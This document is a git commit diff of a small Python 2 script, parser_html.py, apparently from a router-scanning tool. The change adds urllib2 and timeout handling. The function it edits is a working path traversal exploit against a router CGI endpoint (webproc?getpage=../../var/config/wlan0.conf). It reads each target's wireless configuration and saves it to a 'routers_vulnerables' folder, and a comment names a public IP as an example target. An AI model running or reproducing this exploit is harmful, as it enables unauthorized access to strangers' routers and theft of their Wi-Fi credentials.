97329c3fba8a727747fb7533dc355ee1778d5546
TheChapu <yo@hacking.cl>
2017-05-12 11:43:14 -0300

    Update parser_html.py

--- parser_html.py
+++ parser_html.py
@@ -1,12 +1,16 @@
-import urllib
+import urllib2
 
 def get_router_data(ip):
     # Leer datos publicos router
     # example
     # http://201.246.1.12:8000/cgi-bin/webproc?getpage=../../../../../../../../../../../../var/config/wlan0.conf&var:menu=advanced&var:page=dns
-    read_buffer = urllib.urlopen("http://{0}:8000/cgi-bin/webproc?getpage=../../../../../../../../../../../../var/config/wlan0.conf&var:menu=advanced&var:page=dns".format(ip))
-    raw_data = read_buffer.read()
-    data_array = raw_data.split('\n')
+    try:
+        read_buffer = urllib2.urlopen("http://{0}:8000/cgi-bin/webproc?getpage=../../../../../../../../../../../../var/config/wlan0.conf&var:menu=advanced&var:page=dns".format(ip))
+        raw_data = read_buffer.read()
+        data_array = raw_data.split('\n')
+    except urllib2.URLError, e:#Timeout
+	    print "timeout",e
+	    return
     
     # Crear archivo respectivo
     archivo = open('routers_vulnerables/{0}.txt'.format(ip),"w")
